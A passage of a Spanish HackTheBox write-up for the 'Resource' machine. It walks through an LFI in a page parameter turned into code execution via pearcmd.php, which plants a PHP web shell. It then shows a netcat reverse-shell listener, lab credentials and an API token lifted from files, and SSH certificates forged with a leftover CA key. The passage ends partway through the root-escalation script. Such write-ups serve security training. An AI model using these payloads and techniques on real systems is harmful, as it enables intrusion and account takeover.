@@ -1,0 +1,793 @@
+---
+title: "Máquina Resource"
+description: "Resolución de la máquina Resource de HackTheBox"
+tags: ["LFI", "ssh cert auth", "sudo", "bash glob"]
+categories: ["HackTheBox", "Hard", "Linux"]
+logo: "/assets/writeups/resource/logo.webp"
+---
+
+El sitio web de recursos de SSG, programado en PHP tiene un fallo que nos permite incluir archivos locales de la máquina, y especificamente la instalación que usan contiene un archivo que podremos usar para llevar el LFI a una RCE. Luego veremos que haremos dentro de la máquina. 
+
+## Reconocimiento
+
+La máquina tiene 3 puertos abiertos:
+
+```bash
+# Nmap 7.95 scan initiated Sat Aug  3 15:01:02 2024 as: nmap -sS -Pn -n -p- --open -oN ports --min-rate 300 -vvv 10.129.93.114
+Nmap scan report for 10.129.93.114
+Host is up, received user-set (0.43s latency).
+Scanned at 2024-08-03 15:01:02 -04 for 259s
+Not shown: 57220 closed tcp ports (reset), 8312 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE      REASON
+22/tcp   open  ssh          syn-ack ttl 62
+80/tcp   open  http         syn-ack ttl 63
+2222/tcp open  EtherNetIP-1 syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Aug  3 15:05:22 2024 -- 1 IP address (1 host up) scanned in 259.23 seconds
+```
+
+Posee dos puertos de SSH abiertos, completamente distintos. Parece ser que aquí se están utilizando máquinas virtuales o contenedores.
+
+Del otro lado, la página web `itrc.ssg.htb` se ve interesante:
+
+![Website](/assets/writeups/resource/1.png)
+
+Nos permite registrarnos, y al hacerlo tendremos un nuevo panel para poder abrir tickets.
+
+![Tickets](/assets/writeups/resource/2.png)
+
+Veamos que logramos con esto.
+
+## Intrusión
+
+### www-data
+
+Con los tickets no parece que podamos hacer mucho, ya que o nadie los mira o el panel donde se reflejan no es vulnerable a XSS.
+
+Pero, si miramos la URL en la que estamos notaremos algo curioso:
+
+`http://itrc.ssg.htb/index.php?page=dashboard`
+
+Parece que hay un parámetro `page` que podemos alterar, y si probamos a hacer ciertas combinaciones para apuntar a archivos o retroceder directorios veremos cositas:
+
+![Uh oh](/assets/writeups/resource/3.png)
+
+Se ve que podemos alterar esto a conveniencia y que también le está concatenando al parámetro un `.php` al final, ahora el problema radica en que no tenemos ningún archivo especial al que apuntar y los filtros de PHP como `php://filter/...` no parecen funcionar tampoco... pero podriamos tener una alternativa.
+
+Ya que técnicamente podemos hacer referencia a cualquier archivo del sistema... ¿habrá uno nativo de PHP que nos pueda servir? Vamos a buscar; si miramos los archivos contenidos en el paquete de PHP de Debian para buscar cosas que probar, encontraremos una extensión llamada `php-pear`, que contiene los siguientes archivos que son de particular interés:
+
+![PEAR](/assets/writeups/resource/4.png)
+
+¿Estarán en esta máquina? probemos.
+
+Al probar por `/usr/share/php/pearcmd.php` no obtendremos nada, pero si seguimos investigando veremos que el archivo, en los contenedores Docker está en `/usr/local/lib/php/pearcmd.php`, y si lo probamos la misma página nos dará el indicio de que si existe:
+
+![LFI](/assets/writeups/resource/5.png)
+
+Lo que muy probablemente también signifique que el servidor web esté dentro de un contenedor Docker, y de hecho coincide con nuestra hipótesis inicial al ver los dos puertos SSH abiertos.
+
+Ahora, si buscamos información sobre este binario, encontraremos que antes fue utilizado para convertir LFIs a RCEs simplemente abusando de la misma utilidad: al pasarle los parámetros `config-create` junto con un contenido y un path de destino, nos creará el archivo en el path, y el archivo puede ser de extensión PHP y con contenido del mismo lenguaje.
+
+Okay, entonces para abusar esto debemos colocar en la URL:
+
+`itrc.ssg.htb/?+config-create+/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=system($_GET[0]);?>+/tmp/asd.php`
+
+Las barras entre el parámetro `page` son para comentar el propio argumento adicional que pasa el servidor, y utilizamos los signos de apertura de código PHP abreviados para no tener que usar espacios y así el programa pueda tomarlo como un solo argumento. Lo vamos a hacer por consola ya que si lo hacemos por el navegador, ya que este url-encodea los carácteres, el PHP no se interpretará.
+
+```bash
+❯ curl -v 'http://itrc.ssg.htb/?+config-create+/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=system($_GET\[0\])?>+/tmp/asd.php'
+* Host itrc.ssg.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.27
+*   Trying 10.10.11.27:80...
+* Connected to itrc.ssg.htb () port 80
+> GET /?+config-create+/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=echo(system($_GET[0]))?>+/tmp/asd.php HTTP/1.1
+> Host: itrc.ssg.htb
+> User-Agent: curl/8.10.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Sat, 23 Nov 2024 02:08:18 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< X-Powered-By: PHP/8.1.29
+< Set-Cookie: PHPSESSID=e0652d5dce830a463575e30fec007e1a; path=/
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Vary: Accept-Encoding
+... [snip]
+```
+
+Al mandar esta petición a la web, nos saldrá que `System Configuration File Filename #no#system#config# ... Successfully created default configuration file "/tmp/asd.php" ` en todo el log que nos saldrá. Lo que significa que ahora al apuntar a `/tmp/asd.php` con el argumento `0`:
+
+```bash
+❯ curl -v 'http://itrc.ssg.htb/?page=../../../../../../../../../../../../../tmp/asd&0=whoami'
+* Host itrc.ssg.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.27
+*   Trying 10.10.11.27:80...
+* Connected to itrc.ssg.htb () port 80
+> GET /?page=../../../../../../../../../../../../../tmp/as&0=whoami HTTP/1.1
+> Host: itrc.ssg.htb
+> User-Agent: curl/8.10.0
+> Accept: */*
+> 
+... [snip]
+<div class="flash-message" id="flashMessage" style="display: none;"></div><div class="main">#PEAR_Config 0.9
+a:13:{s:7:"php_dir";s:103:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/php";s:8:"data_dir";s:104:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/data";s:7:"www_dir";s:103:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/www";s:7:"cfg_dir";s:103:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/cfg";s:7:"ext_dir";s:103:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/ext";s:7:"doc_dir";s:104:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/docs";s:8:"test_dir";s:105:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/tests";s:9:"cache_dir";s:105:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/cache";s:12:"download_dir";s:108:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/download";s:8:"temp_dir";s:104:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/temp";s:7:"bin_dir";s:99:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear";s:7:"man_dir";s:103:"/&page=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/www-data
+www-data/pear/man";s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}}</div><footer>
+... [snip]
+```
+
+Por lo que ahora podemos proceder a mandarnos una consola interactiva.
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.27 49672
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@itrc:/var/www/itrc$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@itrc:/var/www/itrc$ ^Z
+[1]  + 7643 suspended  nc -lvnp 443
+
+❯ stty raw -echo; fg
+[1]  + 7643 continued  nc -lvnp 443
+                                   reset xterm
+www-data@itrc:/var/www/itrc$ export TERM=xterm-256color
+www-data@itrc:/var/www/itrc$ source /etc/skel/.bashrc
+www-data@itrc:/var/www/itrc$ stty rows 34 columns 149
+```
+
+### msainristil
+
+Notar que no estamos en la máquina real, tal como hemos previsto antes... hay que ver que hacemos para llegar al host como tal.
+
+```bash
+www-data@itrc:/var/www/itrc$ netstat -p tcp -nat
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.11:45127        0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.223.0.3:22          10.10.14.12:33450       ESTABLISHED -                   
+tcp        0      0 172.223.0.3:48664       172.223.0.1:2222        ESTABLISHED -                   
+tcp        0    314 172.223.0.3:33406       10.10.14.15:443         ESTABLISHED -                   
+tcp        0      0 172.223.0.3:22          172.223.0.3:35328       ESTABLISHED -                   
+tcp        0      0 172.223.0.3:56930       10.10.14.12:1337        ESTABLISHED -                   
+tcp        0      0 172.223.0.3:35328       172.223.0.3:22          ESTABLISHED 623/ssh             
+tcp        1      0 172.223.0.3:80          172.223.0.1:59992       CLOSE_WAIT  -                   
+tcp6       0      0 :::22                   :::*                    LISTEN    
+```
+
+Mientras tanto, hay unos usuarios en esta máquina/contenedor:
+
+```bash
+www-data@itrc:/var/www/itrc$ ls -la /home
+total 20
+drwxr-xr-x 1 root        root        4096 Aug 13 11:13 .
+drwxr-xr-x 1 root        root        4096 Aug 13 11:13 ..
+drwx------ 1 msainristil msainristil 4096 Aug 13 11:13 msainristil
+drwx------ 1 zzinter     zzinter     4096 Nov 23 00:28 zzinter
+```
+
+Pero no tenemos alguna contraseña para probar. Asi que lo dejaremos para ver luego.
+
+En cambio, dentro de los archivos de la página web podemos encontrar algunos ficheros dentro del directorio `uploads`:
+
+```bash
+www-data@itrc:/var/www/itrc/uploads$ ls -la
+total 3048
+drwxrwxr-x 1 www-data www-data    4096 Nov 23 07:26 .
+drwxr-xr-x 1 www-data www-data    4096 Nov 23 02:19 ..
+-rw-r--r-- 1 www-data www-data    2699 Nov 23 04:23 9870e12def3a5dbd118d0a66164fd72036d08d4e.zip
+-rw-rw-r-- 1 www-data www-data 1162513 Feb  6  2024 c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
+-rw-r--r-- 1 www-data www-data     139 Nov 23 03:17 d89f0abde8ba62431b1e0ef736f7351c778cf77c.zip
+-rw-rw-r-- 1 www-data www-data     634 Feb  6  2024 e8c6575573384aeeab4d093cc99c7e5927614185.zip
+-rw-rw-r-- 1 www-data www-data     275 Feb  6  2024 eb65074fe37671509f24d1652a44944be61e4360.zip
+-rw-r--r-- 1 www-data www-data      99 Feb  6  2024 id_ed25519.pub
+-rw-r--r-- 1 www-data www-data     569 Feb  6  2024 id_rsa.pub
+-rw-rw-r-- 1 www-data www-data 1903087 Feb  6  2024 itrc.ssg.htb.har
+```
+
+El fichero `.har` parece de interés particular al ser datos JSON; viendo la estructura podemos ver que se trata de algún log de peticiones HTTP por parte de WebInspector...
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "creator": {
+      "name": "WebInspector",
+      "version": "537.36"
+    },
+    "pages": [
+      {
+        "startedDateTime": "2024-02-06T21:34:02.483Z",
+        "id": "page_5",
+        "title": "http://itrc.ssg.htb/",
+        "pageTimings": {
+          "onContentLoad": 34.869999857619405,
+          "onLoad": 70.74499991722405
+        }
+      },
+      {
+        "startedDateTime": "2024-02-06T21:34:05.670Z",
+        "id": "page_6",
+... [snip]
+```
+
+Si filtramos por la url de la web (itrc.ssg.htb), encontraremos peticiones, pero más interesante aún es que hay peticiones a la parte de login:
+
+```bash
+www-data@itrc:/var/www/itrc/uploads$ cat itrc.ssg.htb.har | grep "itrc.ssg.htb/?page=login"
+        "title": "http://itrc.ssg.htb/?page=login",
+          "url": "http://itrc.ssg.htb/?page=login",
+          "url": "http://itrc.ssg.htb/?page=login",
+          "url": "http://itrc.ssg.htb/?page=login",
+          "url": "http://itrc.ssg.htb/?page=login",
+              "value": "http://itrc.ssg.htb/?page=login"
+          "url": "http://itrc.ssg.htb/?page=login",
+              "value": "http://itrc.ssg.htb/?page=login"
+          "url": "http://itrc.ssg.htb/?page=login",
+              "value": "http://itrc.ssg.htb/?page=login"
+              "value": "http://itrc.ssg.htb/?page=login"
+```
+
+Recordando que las peticiones de autenticación se mandan por POST y a la ruta `/api/login`; si mostramos las líneas entre estas coincidencias, veremos algo que llama potencialmente la atención:
+
+```json
+"postData": {
+            "mimeType": "application/x-www-form-urlencoded",
+            "text": "user=msainristil&pass=82yards2closeit",
+            "params": [
+              {
+                "name": "user",
+                "value": "msainristil"
+              },
+              {
+                "name": "pass",
+                "value": "82yards2closeit"
+              }
+            ]
+}
+```
+
+Esta contraseña sirve para el sistema:
+
+```bash
+www-data@itrc:/var/www/itrc/uploads$ su msainristil
+Password: 
+msainristil@itrc:/var/www/itrc/uploads$
+```
+
+y también para la web... veamos que encontramos.
+
+### Old CA control
+
+Al ingresar a la web con estas credenciales que encontramos, veremos un solo ticket que tiene la siguiente conversación entre msainristil y zzinter:
+
+> zzinter: Can you attach a HAR file where the issue happens so the web team can troubleshoot?
+> msainristil: *Archivo adjunto con el har que vimos antes*
+>
+> zzinter: They see the issue. I'm going to have to work with the IT team in corporate to get this resolved. For now, they've given me access to the IT server and a bash script to generate keys. I'll handle all SSH provisioning tickets.
+>
+> msainristil: It's this kind of stuff that makes me say it was a bad idea to move off the old system.
+>
+> zzinter: The API from the IT server seems to be working well now. I've got a script that will sign public keys with the appropriate principal to validate it works. I'm still handling these tickets, but hopefully we'll have it resolved soon.
+>
+> zzinter: All testing of the updated API seems good. At IT's request I've deleted my SSH keys for their server. I'll still handle tickets using the script until we get a chance to update the ITRC web admin panel to use it.
+
+Hablan de alguna API interna para firmar llaves públicas SSH que no funciona, y que por lo tanto zzinter estará atendiendo los tickets para firmar las llaves SSH manualmente con un script. Más que intentar algún tipo de phishing, vamos a acceder a la web como administrador y ver si existen otros tickets que no podamos ver.
+
+También, al hablar de firmar llaves públicas SSH existe una gran posibilidad de que se esté usando una implementación de SSH para autenticarse solamente utilizando sus llaves, siendo el único requisito que dicha llave esté firmada por el CA (Certificate Authority) al que se están autenticado, [en este articulo](https://goteleport.com/blog/how-to-configure-ssh-certificate-based-authentication/) encontraremos como configurarlo y usarlo.
+
+Ahora, volviendo a lo de acceder como administrador; hay unas credenciales de MySQL en el código fuente de la web:
+
+```php
+<?php
+$dsn = "mysql:host=db;dbname=resourcecenter;";
+$dbusername = "jj";
+$dbpassword = "ugEG5rR5SG8uPd";
+$pdo = new PDO($dsn, $dbusername, $dbpassword);
+
+try {
+    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+} catch (PDOException $e) {
+    die("Connection failed: " . $e->getMessage());
+}
+```
+{: file="/var/www/itrc/db.php" }
+
+Vamos a meternos a la base de datos y cambiarle la contraseña a administrador.
+
+En primera instencia podremos ver que el único usuario que parece tener máximos privilegios es `zzinter`:
+
+```bash
+MariaDB [resourcecenter]> select id,user,password from users;
++----+-------------+--------------------------------------------------------------+
+| id | user        | password                                                     |
++----+-------------+--------------------------------------------------------------+
+|  1 | zzinter     | $2y$10$VCpu.vx5K6tK3mZGeir7j.ly..il/YwPQcR2nUs4/jKyUQhGAriL2 |
+|  2 | msainristil | $2y$10$AT2wCUIXC9jyuO.sNMil2.R950wZlVQ.xayHZiweHcIcs9mcblpb6 |
+|  3 | mgraham     | $2y$10$4nlQoZW60mVIQ1xauCe5YO0zZ0uaJisHGJMPNdQNjKOhcQ8LsjLZ2 |
+|  4 | kgrant      | $2y$10$pLPQbIzcehXO5Yxh0bjhlOZtJ18OX4/O4mjYP56U6WnI6FvxvtwIm |
+|  5 | bmcgregor   | $2y$10$nOBYuDGCgzWXIeF92v5qFOCvlEXdI19JjUZNl/zWHHX.RQGTS03Aq |
+|  9 | uwuowo      | $2y$10$IXlsnbl.gtZgRIZwOfGQbuqv17fBs2K3SahbG.Va8eZa81aOIvANi |
+| 10 | kscorpio    | $2y$10$aNxEbYH4yGWaXu5WWsqTTeKQWi299O/w736NMmvAfn5VPB0lfNbNS |
++----+-------------+--------------------------------------------------------------+
+7 rows in set (0.001 sec)
+```
+
+y al cambiarle la contraseña y accediendo, podremos ver muchos más tickets de los que podiamos ver antes en una nueva sección de la página a la que tendremos acceso.
+
+![Admin](/assets/writeups/resource/6.png)
+
+Leyendo uno de los tickets cerrados, podremos tomar en cuenta algo interesante:
+
+**Decommission ITRC SSH Certificate**
+> zzinter: We need to decommission the old ITRC SSH certificate infrastructure in favor of the new organization-wide IT signing certs. I'm handling the transition to the new system from the ITSC-side. Mike - Can you handle removing the old certs from the ITRC server? 
+>
+> msainristil: The new system is super flakey. I know it won't work across the rest of the company, but I'm going to at least leave the old certificate in place here until we prove we can work on the new one?
+>
+> msainristil: Old certificates have been taken out of /etc. I've got the old signing cert secured. This server will trust both the old and the new for some time until we work out any issues with the new system.
+>
+> zzinter: Thanks for the update. I'm sure the new system will be fine. Closing this ticket.
+
+Si eres curioso, seguro habrás visto la carpeta `decommission_old_ca` dentro del directorio personal de msainristil:
+
+```bash
+msainristil@itrc:~$ ls -la
+total 36
+drwx------ 1 msainristil msainristil 4096 Nov 23 08:27 .
+drwxr-xr-x 1 root        root        4096 Aug 13 11:13 ..
+lrwxrwxrwx 1 root        root           9 Aug 13 11:13 .bash_history -> /dev/null
+-rw-r--r-- 1 msainristil msainristil  220 Mar 29  2024 .bash_logout
+-rw-r--r-- 1 msainristil msainristil 3526 Mar 29  2024 .bashrc
+-rw-r--r-- 1 msainristil msainristil  807 Mar 29  2024 .profile
+drwx------ 2 msainristil msainristil 4096 Nov 23 08:27 .ssh
+drwxr-xr-x 1 msainristil msainristil 4096 Nov 23 09:08 decommission_old_ca
+```
+
+Sabiendo que el servidor confia en el certificado viejo (el cual estamos viendo) y el nuevo, esto significa que básicamente tenemos el poder de acceder como quien querramos al servidor. Esto incluye al usuario root.
+
+Generemos una firma para una llave privada con el CA que acabamos de encontrar para poder acceder como root.
+
+```bash
+❯ ssh-keygen -f root                                                
+Generating public/private ed25519 key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in root
+Your public key has been saved in root.pub
+The key fingerprint is:
+SHA256:9PmX0b2t2cS3CYZIIhmS7v90RXB2by90cCPJBZiyqBE vzon@pwnedz0n
+The key randomart image is:
++--[ED25519 256]--+
+|         . o++=o.|
+|    .E   .+o.ooo.|
+|   o .. o o.  .o.|
+|  . ..oo o.. ..oo|
+|   . oo.S.o.  o +|
+|  .  .. o o..  =o|
+|   .   . o ..oo.=|
+|    . . .   ...=+|
+|     ...      oo.|
++----[SHA256]-----+
+❯ ssh-keygen -s ca-itrc -f root -I root@itrc -n root -V +1d root.pub
+Signed user key root-cert.pub: id "root@itrc" serial 0 for root valid from 2024-11-23T09:19:00 to 2024-11-24T09:20:28
+```
+
+Ahora podemos acceder con esta llave sin problemas. El puerto que utiliza el servidor que comprometimos inicialmente es el 22... lo que quiere decir que el 2222 probablemente sea el de la máquina real.
+
+```bash
+❯ /usr/bin/ssh -i root root@itrc.ssg.htb
+Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Nov 23 13:19:52 2024 from 10.10.14.15
+root@itrc:~#
+```
+
+Dentro del directorio personal de `zzinter` podremos encontrar ya la primera flag.
+
+```bash
+root@itrc:/home/zzinter# ls -la
+total 44
+drwx------ 1 zzinter zzinter 4096 Nov 23 10:07 .
+drwxr-xr-x 1 root    root    4096 Aug 13 11:13 ..
+lrwxrwxrwx 1 root    root       9 Aug 13 11:13 .bash_history -> /dev/null
+-rw-r--r-- 1 zzinter zzinter  220 Mar 29  2024 .bash_logout
+-rw-r--r-- 1 zzinter zzinter 3526 Mar 29  2024 .bashrc
+-rw-r--r-- 1 zzinter zzinter  807 Mar 29  2024 .profile
+-rw------- 1 root    root    3414 Nov 23 09:51 id_rsa_support
+-rw------- 1 root    root    1280 Nov 23 10:07 id_rsa_support-cert.pub
+-rw-r--r-- 1 root    root     735 Nov 23 09:51 id_rsa_support.pub
+-rw-rw-r-- 1 root    root    1193 Feb 19  2024 sign_key_api.sh
+-rw-r----- 1 root    zzinter   33 Nov 23 00:26 user.txt
+root@itrc:/home/zzinter# cat user.txt
+51167a6a6c935efeafa800e518******
+```
+
+## Escalada de privilegios
+
+### zzinter - ssg
+
+Si viste los archivos de antes, notaste el script de bash con el siguiente contenido:
+
+```bash
+#!/bin/bash
+
+usage () {
+    echo "Usage: $0 <public_key_file> <username> <principal>"
+    exit 1
+}
+
+if [ "$#" -ne 3 ]; then
+    usage
+fi
+
+public_key_file="$1"
+username="$2"
+principal_str="$3"
+
+supported_principals="webserver,analytics,support,security"
+IFS=',' read -ra principal <<< "$principal_str"
+for word in "${principal[@]}"; do
+    if ! echo "$supported_principals" | grep -qw "$word"; then
+        echo "Error: '$word' is not a supported principal."
+        echo "Choose from:"
+        echo "    webserver - external web servers - webadmin user"
+        echo "    analytics - analytics team databases - analytics user"
+        echo "    support - IT support server - support user"
+        echo "    security - SOC servers - support user"
+        echo
+        usage
+    fi
+done
+
+if [ ! -f "$public_key_file" ]; then
+    usage
+fi
+
+public_key_file="$1"
+username="$2"
+principal_str="$3"
+
+supported_principals="webserver,analytics,support,security"
+IFS=',' read -ra principal <<< "$principal_str"
+for word in "${principal[@]}"; do
+    if ! echo "$supported_principals" | grep -qw "$word"; then
+        echo "Error: '$word' is not a supported principal."
+        echo "Choose from:"
+        echo "    webserver - external web servers - webadmin user"
+        echo "    analytics - analytics team databases - analytics user"
+        echo "    support - IT support server - support user"
+        echo "    security - SOC servers - support user"
+        echo
+        usage
+    fi
+done
+
+if [ ! -f "$public_key_file" ]; then
+    echo "Error: Public key file '$public_key_file' not found."
+    usage
+fi
+
+public_key=$(cat $public_key_file)
+
+curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
+```
+{: file="sign_key_api.sh" }
+
+Al final del archivo podemos ver un host nuevo y un Bearer de autenticación, esto se ve que es el script del que zzinter hablaba en el ticket que vimos de msainristil.
+
+Antes de generar una firma con este script, vamos a ver que tiene esta web que acabamos de descubrir. Enviando una petición POST al endpoint con el Bearer que descubrimos, nos devuelve una llave pública firmada:
+
+```bash
+❯ curl -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE" --json "{\"pubkey\":\"... [snip] ...\",\"username\":\"some\",\"principals\":\"some\"}" -v http://signserv.ssg.htb/v1/sign
+* Host signserv.ssg.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.27
+*   Trying 10.10.11.27:80...
+* Connected to signserv.ssg.htb () port 80
+> POST /v1/sign HTTP/1.1
+> Host: signserv.ssg.htb
+> User-Agent: curl/8.10.0
+> Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE
+> Content-Type: application/json
+> Accept: application/json
+> Content-Length: 137
+> 
+* upload completely sent off: 137 bytes
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Sat, 23 Nov 2024 13:45:08 GMT
+< Content-Type: text/plain; charset=utf-8
+< Content-Length: 651
+< Connection: keep-alive
+< 
+ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAIKh+UAd7D0toAPC1HM5jXXimXrsrTbFMUxFqS/wpN/20AAAAIAe9awtXoP1z6IGlzQOK1EidJfOmdKQPpBKLClRoywPRAAAAAAAAAC4AAAABAAAABHNvbWUAAAAIAAAABHNvbWUAAAAAZziiJP//////////AAAAAAAAAIIAAAAVcGVybWl0LVgxMS1mb3J3YXJkaW5nAAAAAAAAABdwZXJtaXQtYWdlbnQtZm9yd2FyZGluZwAAAAAAAAAWcGVybWl0LXBvcnQtZm9yd2FyZGluZwAAAAAAAAAKcGVybWl0LXB0eQAAAAAAAAAOcGVybWl0LXVzZXItcmMAAAAAAAAAAAAAADMAAAALc3NoLWVkMjU1MTkAAAAggeDwK53LVKHJh+rMLcA2WABxbtDgyhm57MATyY0VKbEAAABTAAAAC3NzaC1lZDI1NTE5AAAAQN5HvYTNSZLq1iMD1lQNkcML2vSDzheroLy57Txp66mLWwYYg2WLySxU0i2MefIqlyhrHMO6eh1ZOcAl7B1p6gY= /tmp/tmptbxyecwl.pub
+* Connection #0 to host signserv.ssg.htb left intact
+```
+
+Ahora, en el script podemos observar que hay varios principales para elegir, pero si probamos veremos que el único principal que nos da acceso al puerto 2222 es `support`:
+
+```bash
+❯ /usr/bin/ssh -i zzinter -p 2222 support@itrc.ssg.htb
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)
+
+... [snip]
+
+Last login: Sat Nov 23 10:10:29 2024 from 172.223.0.3
+support@ssg:~$
+```
+
+Ahora si estamos en la máquina real, podemos ver que no hay muchos usuarios creados:
+
+```bash
+support@ssg:/home$ ls -la
+total 16
+drwxr-xr-x  4 root    root    4096 Jul 23 13:44 .
+drwxr-xr-x 19 root    root    4096 Jul 24 11:54 ..
+drwxr-x---  4 support support 4096 Jun 21 18:11 support
+drwxr-x---  4 zzinter zzinter 4096 Aug 13 11:15 zzinter
+```
+
+Indagando por el sistema de archivos, dentro de `/etc/ssh/auth_principals` podemos encontrar lo que probablemente son los principales con los que podemos acceder...
+
+```bash
+support@ssg:/etc/ssh/auth_principals$ ls -la
+total 20
+drwxr-xr-x 2 root root 4096 Feb  8  2024 .
+drwxr-xr-x 5 root root 4096 Jul 24 12:24 ..
+-rw-r--r-- 1 root root   10 Feb  8  2024 root
+-rw-r--r-- 1 root root   18 Feb  8  2024 support
+-rw-r--r-- 1 root root   13 Feb  8  2024 zzinter
+```
+
+Si vemos el contenido de los archivos, hay nombres
+
+```bash
+support@ssg:/etc/ssh/auth_principals$ xxd zzinter
+00000000: 7a7a 696e 7465 725f 7465 6d70 0a         zzinter_temp.
+support@ssg:/etc/ssh/auth_principals$ xxd support
+00000000: 7375 7070 6f72 740a 726f 6f74 5f75 7365  support.root_use
+00000010: 720a                                     r.
+support@ssg:/etc/ssh/auth_principals$ xxd root
+00000000: 726f 6f74 5f75 7365 720a                 root_user.
+```
+
+Al intentar crear una firma para `root_user`, la API REST nos tirará un error diciendo que no podemos crear una firma para ese principal sin autenticación manual... pero con el `zzinter_temp` si nos deja, y dicha firma creada nos deja acceder como zzinter (se ve que no eliminaron esto, como comentaban en uno de los tickets de la web):
+
+```bash
+❯ /usr/bin/ssh -i zzinter -p 2222 zzinter@itrc.ssg.htb
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)
+
+... [snip]
+
+Last login: Sat Nov 23 01:24:26 2024 from 10.10.14.205
+zzinter@ssg:~$
+```
+
+### root - ssg
+
+Tenemos un privilegio sudo:
+
+```bash
+zzinter@ssg:~$ sudo -l
+Matching Defaults entries for zzinter on ssg:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User zzinter may run the following commands on ssg:
+    (root) NOPASSWD: /opt/sign_key.sh
+```
+
+El script contiene lo siguiente:
+
+```bash
+#!/bin/bash
+
+usage () {
+    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
+    exit 1
+}
+
+if [ "$#" -ne 5 ]; then
+    usage
+fi
+
+ca_file="$1"
+public_key_file="$2"
+username="$3"
+principal_str="$4"
+serial="$5"
+
+if [ ! -f "$ca_file" ]; then
+    echo "Error: CA file '$ca_file' not found."
+    usage
+fi
+
+itca=$(cat /etc/ssh/ca-it)
+ca=$(cat "$ca_file")
+if [[ $itca == $ca ]]; then
+    echo "Error: Use API for signing with this CA."
+    usage
+fi
+
+if [ ! -f "$public_key_file" ]; then
+    echo "Error: Public key file '$public_key_file' not found."
+    usage
+fi
+
+supported_principals="webserver,analytics,support,security"
+IFS=',' read -ra principal <<< "$principal_str"
+for word in "${principal[@]}"; do
+    if ! echo "$supported_principals" | grep -qw "$word"; then
+        echo "Error: '$word' is not a supported principal."
+        echo "Choose from:"
+        echo "    webserver - external web servers - webadmin user"
+        echo "    analytics - analytics team databases - analytics user"
+        echo "    support - IT support server - support user"
+        echo "    security - SOC servers - support user"
+        echo
+        usage
+    fi
+done
+
+if ! [[ $serial =~ ^[0-9]+$ ]]; then
+    echo "Error: '$serial' is not a number."
+    usage
+fi
+
